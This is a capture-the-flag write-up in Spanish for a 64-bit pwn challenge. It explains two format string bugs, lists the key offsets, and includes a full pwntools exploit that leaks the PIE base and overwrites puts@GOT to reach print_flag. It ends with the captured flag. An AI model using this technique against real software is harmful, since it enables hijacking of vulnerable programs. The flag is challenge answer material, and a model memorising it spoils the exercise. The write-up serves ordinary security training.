# Plin Plon Plin - Writeup

## Challenge Info
- **Category:** PWN
- **Remote:** `nc 0.cloud.chals.io 11359`

## Analysis

Binary de 64 bits con las siguientes protecciones:
```
RELRO:      No RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

### Vulnerabilidad

La función `vuln()` tiene **dos format string vulnerabilities**:

```c
void vuln() {
    char buf[0x80];
    puts("plin:");
    fgets(buf, 0x80, stdin);
    printf(buf);              // FSB #1
    puts("plon:");
    fgets(buf, 0x80, stdin);
    printf(buf);              // FSB #2
    putchar('\n');
    puts("skill issue");
}
```

Existe una función `print_flag()` en 0x11a9 que lee y muestra `flag.txt`.

## Estrategia

1. **Primer printf**: Leak de PIE base usando `%25$p` (return address a main+0x76)
2. **Segundo printf**: Sobrescribir `puts@GOT` con la dirección de `print_flag`
3. **Trigger**: Cuando se ejecuta `puts("skill issue")`, salta a `print_flag()`

## Offsets Clave

| Elemento | Offset |
|----------|--------|
| Buffer en stack | 6 |
| Return address | 25 |
| `print_flag` | base + 0x11a9 |
| `puts@GOT` | base + 0x3468 |

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = remote('0.cloud.chals.io', 11359)

# Stage 1: Leak PIE base
p.recvuntil(b'plin:')
p.sendline(b'%25$p')
data = p.recvuntil(b'plon:')
leak = data.split(b'\n')[1].strip()
ret_addr = int(leak, 16)
pie_base = ret_addr - 0x1371

print_flag = pie_base + 0x11a9
puts_got = pie_base + 0x3468

# Stage 2: Overwrite puts@GOT with print_flag
payload = fmtstr_payload(6, {puts_got: print_flag})
p.sendline(payload)

# Get flag
p.interactive()
```

## Flag

```
HackOn{n0_m3_e5per4b4_0tr0_plin_plon}
```
